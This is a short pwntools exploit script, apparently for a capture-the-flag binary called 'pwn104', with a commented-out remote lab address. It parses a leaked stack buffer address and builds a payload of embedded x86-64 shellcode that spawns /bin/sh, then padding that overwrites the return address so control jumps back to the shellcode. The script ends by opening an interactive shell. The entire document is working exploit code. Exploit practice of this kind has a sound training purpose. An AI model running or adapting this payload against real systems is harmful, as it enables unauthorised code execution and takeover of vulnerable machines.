from pwn import *
from pwn import p32, p64

context.log_level = 'info'
context.binary = binary = ELF("./pwn104.pwn104")
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

p = process()
#p = remote('10.10.153.68', 9004)

p.recv()
output = p.recv()

buffer_addr = int(output.split(b'at')[1].strip().decode('utf-8'), 16)

log.info("buffer_addr: {}".format(hex(buffer_addr)))
payload = shellcode + b'A'*(0x50 - len(shellcode)) + b'B'*0x8 + p64(buffer_addr) 

p.sendline(payload)
p.interactive()